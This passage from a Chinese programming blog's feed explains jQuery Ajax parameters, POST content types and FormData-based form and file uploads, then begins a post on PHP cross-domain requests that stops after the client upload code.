&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge257531&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge257531&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; Ajax 参数详解&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;jQuery Ajax 代码格式示例&lt;/label&gt;&lt;pre class=&quot;src src-javascript&quot;&gt;$.ajax({
        url: URL, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#21457;&amp;#36865;&amp;#35831;&amp;#27714;&amp;#30340;&amp;#22320;&amp;#22336;&amp;#65288;&amp;#40664;&amp;#35748;&amp;#20026;&amp;#24403;&amp;#21069;&amp;#39029;&amp;#22320;&amp;#22336;)&lt;/span&gt;
  type: &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;POST&quot;&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35831;&amp;#27714;&amp;#26041;&amp;#24335;&amp;#65306;post/get/put/delete&amp;#65288;&amp;#40664;&amp;#35748;&amp;#20026;get)&lt;/span&gt;
  timeout: 600, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35831;&amp;#27714;&amp;#36229;&amp;#26102;&amp;#26102;&amp;#38388;&amp;#65292;&amp;#21333;&amp;#20301;&amp;#27627;&amp;#31186;&lt;/span&gt;
  async:&lt;span style=&quot;color: #008b8b;&quot;&gt;true&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;true&amp;#65292;&amp;#24322;&amp;#27493;&amp;#35831;&amp;#27714;&amp;#65307;false&amp;#65292;&amp;#21516;&amp;#27493;&amp;#35831;&amp;#27714;&amp;#12290;&lt;/span&gt;
  cache:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;true&amp;#65292;&amp;#20174;&amp;#27983;&amp;#35272;&amp;#22120;&amp;#21152;&amp;#36733;&amp;#32531;&amp;#23384;&amp;#65307;false&amp;#65292;&amp;#19981;&amp;#20174;&amp;#27983;&amp;#35272;&amp;#22120;&amp;#21152;&amp;#36733;&amp;#32531;&amp;#23384;&lt;/span&gt;
  data: JSON.stringify(stream), &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#21457;&amp;#36865;&amp;#21040;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#65292;&amp;#35201;&amp;#27714;&amp;#20026;Object&amp;#25110;String&amp;#31867;&amp;#22411;&amp;#30340;&amp;#21442;&amp;#25968;&amp;#12290;&lt;/span&gt;
  dataType: &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;json&quot;&lt;/span&gt;,&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#39044;&amp;#26399;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#36820;&amp;#22238;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#31867;&amp;#22411;&amp;#12290;&amp;#21487;&amp;#29992;&amp;#30340;&amp;#31867;&amp;#22411;&amp;#26377;:xml,html,script,json,jsonp,text&lt;/span&gt;
  contentType: &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;application/json; charset=utf-8&quot;&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#24403;&amp;#21457;&amp;#36865;&amp;#20449;&amp;#24687;&amp;#33267;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#26102;&amp;#65292;&amp;#20869;&amp;#23481;&amp;#32534;&amp;#30721;&amp;#31867;&amp;#22411;&amp;#12290;&amp;#40664;&amp;#35748;&amp;#20026;&quot;application/x-www-form-urlencoded&quot;&amp;#65292;multipart/form-data&amp;#65306;&amp;#26377;&amp;#26102;&amp;#20505;&amp;#20063;&amp;#20250;&amp;#36825;&amp;#20010;&amp;#65292;&amp;#19978;&amp;#20256;&amp;#19979;&amp;#36733;&amp;#21487;&amp;#33021;&amp;#20250;&amp;#29992;&amp;#21040;&amp;#12290;&lt;/span&gt;
  &lt;span style=&quot;color: #0000ff;&quot;&gt;beforeSend&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;XMLHttpRequest&lt;/span&gt;){
        &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35774;&amp;#32622;&amp;#35831;&amp;#27714;&amp;#22836;,&amp;#21152;&amp;#36733;loading&amp;#30028;&amp;#38754;&lt;/span&gt;
  },
  &lt;span style=&quot;color: #0000ff;&quot;&gt;dataFilter&lt;/span&gt;:&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(){ &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#32473;Ajax&amp;#36820;&amp;#22238;&amp;#30340;&amp;#21407;&amp;#22987;&amp;#25968;&amp;#25454;&amp;#36827;&amp;#34892;&amp;#39044;&amp;#22788;&amp;#29702;&amp;#30340;&amp;#20989;&amp;#25968;&amp;#12290;&amp;#25552;&amp;#20379;data&amp;#21644;type&amp;#20004;&amp;#20010;&amp;#21442;&amp;#25968;&amp;#12290;data&amp;#26159;Ajax&amp;#36820;&amp;#22238;&amp;#30340;&amp;#21407;&amp;#22987;&amp;#25968;&amp;#25454;&amp;#65292;type&amp;#26159;&amp;#35843;&amp;#29992;jQuery.ajax&amp;#26102;&amp;#25552;&amp;#20379;&amp;#30340;dataType&amp;#21442;&amp;#25968;&amp;#12290;&lt;/span&gt;
        &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;
  },
  global:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#34920;&amp;#31034;&amp;#26159;&amp;#21542;&amp;#35302;&amp;#21457;&amp;#20840;&amp;#23616;ajax&amp;#20107;&amp;#20214;&amp;#12290;&amp;#40664;&amp;#35748;&amp;#20026;true&amp;#12290;&lt;/span&gt;
  ifModified:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#20165;&amp;#22312;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#25968;&amp;#25454;&amp;#25913;&amp;#21464;&amp;#26102;&amp;#33719;&amp;#21462;&amp;#26032;&amp;#25968;&amp;#25454;&amp;#12290;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#25968;&amp;#25454;&amp;#25913;&amp;#21464;&amp;#21028;&amp;#26029;&amp;#30340;&amp;#20381;&amp;#25454;&amp;#26159;Last-Modified&amp;#22836;&amp;#20449;&amp;#24687;&amp;#12290;&amp;#40664;&amp;#35748;&amp;#20540;&amp;#26159;false&amp;#65292;&amp;#21363;&amp;#24573;&amp;#30053;&amp;#22836;&amp;#20449;&amp;#24687;&amp;#12290;&lt;/span&gt;
  jsonP:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#22312;&amp;#19968;&amp;#20010;jsonp&amp;#35831;&amp;#27714;&amp;#20013;&amp;#37325;&amp;#20889;&amp;#22238;&amp;#35843;&amp;#20989;&amp;#25968;&amp;#30340;&amp;#21517;&amp;#23383;&amp;#12290; &lt;/span&gt;
  username:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;zrg&quot;&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#29992;&amp;#20110;&amp;#21709;&amp;#24212;HTTP&amp;#35775;&amp;#38382;&amp;#35748;&amp;#35777;&amp;#35831;&amp;#27714;&amp;#30340;&amp;#29992;&amp;#25143;&amp;#21517;&amp;#12290;&lt;/span&gt;
  password:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;123456&quot;&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#29992;&amp;#20110;&amp;#21709;&amp;#24212;HTTP&amp;#35775;&amp;#38382;&amp;#35748;&amp;#35777;&amp;#35831;&amp;#27714;&amp;#30340;&amp;#23494;&amp;#30721;&amp;#12290;&lt;/span&gt;
  processData:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#40664;&amp;#35748;&amp;#24773;&amp;#20917;&amp;#19979;&amp;#65292;&amp;#21457;&amp;#36865;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#23558;&amp;#34987;&amp;#36716;&amp;#25442;&amp;#20026;&amp;#23545;&amp;#35937;&amp;#65288;&amp;#20174;&amp;#25216;&amp;#26415;&amp;#35282;&amp;#24230;&amp;#26469;&amp;#35762;&amp;#24182;&amp;#38750;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#65289;&amp;#20197;&amp;#37197;&amp;#21512;&amp;#40664;&amp;#35748;&amp;#20869;&amp;#23481;&amp;#31867;&amp;#22411;&quot;application/x-www-form-urlencoded&quot;&amp;#12290;&amp;#22914;&amp;#26524;&amp;#35201;&amp;#21457;&amp;#36865;DOM&amp;#26641;&amp;#20449;&amp;#24687;&amp;#25110;&amp;#32773;&amp;#20854;&amp;#20182;&amp;#19981;&amp;#24076;&amp;#26395;&amp;#36716;&amp;#25442;&amp;#30340;&amp;#20449;&amp;#24687;&amp;#65292;&amp;#35831;&amp;#35774;&amp;#32622;&amp;#20026;false&amp;#12290;&lt;/span&gt;
  scriptCharset:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;&quot;&lt;/span&gt;, &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#21482;&amp;#26377;&amp;#24403;&amp;#35831;&amp;#27714;&amp;#26102;dataType&amp;#20026;&quot;jsonp&quot;&amp;#25110;&amp;#32773;&quot;script&quot;&amp;#65292;&amp;#24182;&amp;#19988;type&amp;#26159;GET&amp;#26102;&amp;#25165;&amp;#20250;&amp;#29992;&amp;#20110;&amp;#24378;&amp;#21046;&amp;#20462;&amp;#25913;&amp;#23383;&amp;#31526;&amp;#38598;(charset)&amp;#12290;&amp;#36890;&amp;#24120;&amp;#22312;&amp;#26412;&amp;#22320;&amp;#21644;&amp;#36828;&amp;#31243;&amp;#30340;&amp;#20869;&amp;#23481;&amp;#32534;&amp;#30721;&amp;#19981;&amp;#21516;&amp;#26102;&amp;#20351;&amp;#29992;&amp;#12290;&lt;/span&gt;
  &lt;span style=&quot;color: #0000ff;&quot;&gt;complete&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;XMLHttpRequest&lt;/span&gt;, &lt;span style=&quot;color: #a0522d;&quot;&gt;textStatus&lt;/span&gt;){ &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35831;&amp;#27714;&amp;#23436;&amp;#25104;&amp;#21518;&amp;#35843;&amp;#29992;&amp;#30340;&amp;#22238;&amp;#35843;&amp;#20989;&amp;#25968;&amp;#65288;&amp;#35831;&amp;#27714;&amp;#25104;&amp;#21151;&amp;#25110;&amp;#22833;&amp;#36133;&amp;#26102;&amp;#22343;&amp;#35843;&amp;#29992;&amp;#65289;&lt;/span&gt;
        &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;
  },
  &lt;span style=&quot;color: #0000ff;&quot;&gt;success&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt; (&lt;span style=&quot;color: #a0522d;&quot;&gt;data&lt;/span&gt;,&lt;span style=&quot;color: #a0522d;&quot;&gt;textStatus&lt;/span&gt;) { &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35831;&amp;#27714;&amp;#25104;&amp;#21151;&amp;#21518;&amp;#35843;&amp;#29992;&amp;#30340;&amp;#22238;&amp;#35843;&amp;#20989;&amp;#25968;&amp;#65292;&amp;#26377;&amp;#20004;&amp;#20010;&amp;#21442;&amp;#25968;: (1)&amp;#30001;&amp;#26381;&amp;#21153;&amp;#22120;&amp;#36820;&amp;#22238;&amp;#65292;&amp;#24182;&amp;#26681;&amp;#25454;dataType&amp;#21442;&amp;#25968;&amp;#36827;&amp;#34892;&amp;#22788;&amp;#29702;&amp;#21518;&amp;#30340;&amp;#25968;&amp;#25454;;(2)&amp;#25551;&amp;#36848;&amp;#29366;&amp;#24577;&amp;#30340;&amp;#23383;&amp;#31526;&amp;#20018;&amp;#12290;&lt;/span&gt;
        &lt;span style=&quot;color: #a020f0;&quot;&gt;if&lt;/span&gt; (data.success) {
                &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
      } &lt;span style=&quot;color: #a020f0;&quot;&gt;else&lt;/span&gt; {
        &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
      }
  },
  &lt;span style=&quot;color: #0000ff;&quot;&gt;error&lt;/span&gt;: &lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;XMLHttpRequest&lt;/span&gt;, &lt;span style=&quot;color: #a0522d;&quot;&gt;textStatus&lt;/span&gt;, &lt;span style=&quot;color: #a0522d;&quot;&gt;errorThrown&lt;/span&gt;){ &lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#35831;&amp;#27714;&amp;#22833;&amp;#36133;&amp;#26102;&amp;#34987;&amp;#35843;&amp;#29992;&amp;#30340;&amp;#20989;&amp;#25968;&amp;#12290;&amp;#26377;3&amp;#20010;&amp;#21442;&amp;#25968;&amp;#65292;&amp;#21363;XMLHttpRequest&amp;#23545;&amp;#35937;&amp;#12289;&amp;#38169;&amp;#35823;&amp;#20449;&amp;#24687;&amp;#12289;&amp;#25429;&amp;#33719;&amp;#30340;&amp;#38169;&amp;#35823;&amp;#23545;&amp;#35937;(&amp;#21487;&amp;#36873;)&amp;#12290;&lt;/span&gt;
        &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
  }
});
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3fbdae6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3fbdae6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 常见的 POST 提交数据方式&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
application/x-www-form-urlencoded
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
浏览器的原生 &amp;lt;form&amp;gt; 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
multipart/form-data
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
一般用来上传文件

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
application/json
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
该方案可以方便的提交复杂的数据结构，特别适合 RESTful 的接口。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
text/xml
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
XML 结构传输。
XML-RPC（XML Remote Procedure Call），它是一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。它的使用也很
广泛，如 WordPress 的 XML-RPC Api，搜索引擎的 ping 服务等等。

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge6b99d6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge6b99d6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 提交 Form 表单(包括文件上传)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org700c795&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org700c795&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.1&lt;/span&gt; 常规方法&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;一般是这样的&lt;/label&gt;&lt;pre class=&quot;src src-js&quot;&gt;$.ajax({
        url:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;${pageContext.request.contextPath}/public/testupload&quot;&lt;/span&gt;,
    type:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;post&quot;&lt;/span&gt;,
    data:{username:username},
    &lt;span style=&quot;color: #0000ff;&quot;&gt;success&lt;/span&gt;:&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;data&lt;/span&gt;){
        window.clearInterval(timer);
        &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
    },
    &lt;span style=&quot;color: #0000ff;&quot;&gt;error&lt;/span&gt;:&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;e&lt;/span&gt;){
        &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
    }
});

&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;&amp;#25110;&amp;#32773;&amp;#21333;&amp;#19968;&amp;#33719;&amp;#21462;&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;username&lt;/span&gt; = $(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;#username&quot;&lt;/span&gt;).val();
&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;password&lt;/span&gt; = $(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;#password&quot;&lt;/span&gt;).val();
...
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
// 以上方式，如果数量少的话，那还没有什么，但是如果数据十分大的话，那就十分的麻烦。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org29756f7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org29756f7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.2&lt;/span&gt; 使用 FormData 对象&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-2&quot;&gt;
&lt;p&gt;
// 下面就介绍提高开发效率的方法
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 4: &lt;/span&gt;使用 FormData 对象（XMLHttpRequest）&lt;/label&gt;&lt;pre class=&quot;src src-js&quot;&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #b22222;&quot;&gt;FormData&amp;#23545;&amp;#35937;&amp;#26159;html5&amp;#30340;&amp;#19968;&amp;#20010;&amp;#23545;&amp;#35937;&amp;#65292;&amp;#30446;&amp;#21069;&amp;#30340;&amp;#19968;&amp;#20123;&amp;#20027;&amp;#27969;&amp;#30340;&amp;#27983;&amp;#35272;&amp;#22120;&amp;#37117;&amp;#24050;&amp;#32463;&amp;#20860;&amp;#23481;&amp;#12290;&lt;/span&gt;
&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;form&lt;/span&gt; = &lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;FormData&lt;/span&gt;();
form.append(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;username&quot;&lt;/span&gt;,&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;zxj&quot;&lt;/span&gt;);
form.append(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;password&quot;&lt;/span&gt;,123456);
&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;req&lt;/span&gt; = &lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;XMLHttpRequest&lt;/span&gt;();
req.open(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;post&quot;&lt;/span&gt;, &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;${pageContext.request.contextPath}/public/testupload&quot;&lt;/span&gt;, &lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;);
req.send(form);
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 5: &lt;/span&gt;使用 FormData 对象（jQuery Ajax）&lt;/label&gt;&lt;pre class=&quot;src src-js&quot;&gt;&lt;span style=&quot;color: #a020f0;&quot;&gt;var&lt;/span&gt; &lt;span style=&quot;color: #a0522d;&quot;&gt;form&lt;/span&gt; = &lt;span style=&quot;color: #a020f0;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #228b22;&quot;&gt;FormData&lt;/span&gt;();
form.append(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;username&quot;&lt;/span&gt;,&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;zxj&quot;&lt;/span&gt;);
form.append(&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;password&quot;&lt;/span&gt;,123456);
$.ajax({
        url:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;${pageContext.request.contextPath}/public/testupload&quot;&lt;/span&gt;,
    type:&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;post&quot;&lt;/span&gt;,
    data:form,
    processData:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;,
    contentType:&lt;span style=&quot;color: #008b8b;&quot;&gt;false&lt;/span&gt;,
    &lt;span style=&quot;color: #0000ff;&quot;&gt;success&lt;/span&gt;:&lt;span style=&quot;color: #a020f0;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #a0522d;&quot;&gt;data&lt;/span&gt;){
        window.clearInterval(timer);
            &lt;span style=&quot;color: #b22222;&quot;&gt;//&lt;/span&gt;
    }
});
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org377090b&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org377090b&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;3.3.3&lt;/span&gt; 使用 jQuery.form.js&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-3-3-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
具体参考https://github.com/jquery-form/form

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org230c7c9&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org230c7c9&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://baike.baidu.com/item/ajax&quot;&gt;Ajax 百度百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/qq_27093465/article/details/49799341&quot;&gt;$.ajax({});的各个参数的理解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/zhuxiaojie/p/4783939.html&quot;&gt;使用ajax提交form表单，包括ajax文件上传&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Ajax" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">PHP 跨域问题解决</title><link href="http://localhost:4000/php/2018/09/17/php-cross-domain/" rel="alternate" type="text/html" title="PHP 跨域问题解决" /><published>2018-09-17T00:00:00+08:00</published><updated>2018-09-17T00:00:00+08:00</updated><id>http://localhost:4000/php/2018/09/17/php-cross-domain</id><content type="html" xml:base="http://localhost:4000/php/2018/09/17/php-cross-domain/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org253a050&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org253a050&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 问题概述&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
现代浏览器针对不同域名之间的ajax请求，一般情况下会阻止你获取到ajax返回内容（即使是1.a.com和2.a.com也算跨域）。这是浏览器的为安全性考虑实施的非常重要的安全策略。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf368a43&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgf368a43&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 请求跨域问题解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
下面通过一个 Ajax 请求示例来说明：

&lt;/pre&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3c133bd&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3c133bd&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; Client&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;客户端请求代码&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;// &amp;#19978;&amp;#20256;&amp;#25991;&amp;#20214;
function upload_idcard_file(_this,type){
        var formData = new FormData()&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        formData.append('type',type)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        formData.append('file',_this.files[0])&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
        $.ajax({
                url: '{$upload_file_url}',
                type: 'POST',
                dataType: 'json',
                data: formData,
                cache: false,
                contentType : false,
                processData : false,
                headers : {&lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;access_token&quot;&lt;/span&gt; : &lt;span style=&quot;color: #8b2252;&quot;&gt;&quot;{$access_token}&quot;&lt;/span&gt;},
                success:function(d){
                        var img_url = d.data&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                        img_url = 'http:'+img_url&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                        load_img(_this.id,img_url)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                },
                error:function(err){
                        console.log(err)&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
                }
        })&lt;span style=&quot;color: #b22222;&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;
